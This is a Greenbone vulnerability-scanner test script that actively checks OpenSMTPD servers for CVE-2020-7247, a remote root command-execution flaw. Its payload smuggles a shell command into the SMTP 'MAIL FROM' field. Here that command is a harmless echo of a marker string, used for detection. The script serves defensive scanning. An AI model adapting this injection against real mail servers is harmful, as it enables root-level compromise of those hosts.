# SPDX-FileCopyrightText: 2024 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:openbsd:opensmtpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.153183");
  script_version("2024-09-27T05:05:23+0000");
  script_tag(name:"last_modification", value:"2024-09-27 05:05:23 +0000 (Fri, 27 Sep 2024)");
  script_tag(name:"creation_date", value:"2024-09-25 05:04:51 +0000 (Wed, 25 Sep 2024)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-01-31 14:43:52 +0000 (Fri, 31 Jan 2020)");

  script_cve_id("CVE-2020-7247");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("OpenSMTPD < 6.6.2p1 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2024 Greenbone AG");
  script_family("SMTP problems");
  script_dependencies("gb_opensmtpd_smtp_detect.nasl", "smtp_settings.nasl");
  script_require_ports("Services/smtp", 25);
  script_mandatory_keys("opensmtpd/smtp/detected");

  script_tag(name:"summary", value:"OpenSMTPD is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted SMTP request and checks the response.");

  script_tag(name:"insight", value:"smtp_mailaddr in smtp_session.c in OpenSMTPD allows remote
  attackers to execute arbitrary commands as root via a crafted SMTP session, as demonstrated by
  shell metacharacters in a MAIL FROM field. This affects the 'uncommented' default configuration.
  The issue exists because of an incorrect return value upon failure of input validation.");

  script_tag(name:"affected", value:"OpenSMTPD version 6.6.x prior to 6.6.2p1.");

  script_tag(name:"solution", value:"Update to version 6.6.2p1 or later.");

  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2020/01/28/3");
  script_xref(name:"URL", value:"https://www.mail-archive.com/misc@opensmtpd.org/msg04850.html");
  script_xref(name:"URL", value:"https://www.kb.cert.org/vuls/id/390745");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("smtp_func.inc");

if (!port = get_app_port(cpe: CPE, service: "smtp"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

helo_name = smtp_get_helo_from_kb(port: port);

if (!soc = smtp_open(port: port, data: helo_name, send_ehlo: FALSE, code: "250"))
  exit(0);

vt_strings = get_vt_strings();
pattern = vt_strings["default"];

payload = "MAIL FROM: <;echo " + pattern + ';>\r\n';

send(socket: soc, data: payload);
res = smtp_recv_line(socket: soc, code: "250");

smtp_close(socket: soc, check_data: FALSE);

if (!isnull(res) && egrep(pattern: "250 .*Ok", string: res, icase: TRUE)) {
  report = "The OpenSMTPD server accepted a crafted SMTP 'MAIL FROM' command which indicates " +
           "that the server is affected." + '\n\nRequest:\n\n' + chomp(payload) +
           '\n\nResponse:\n\n' + chomp(res);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
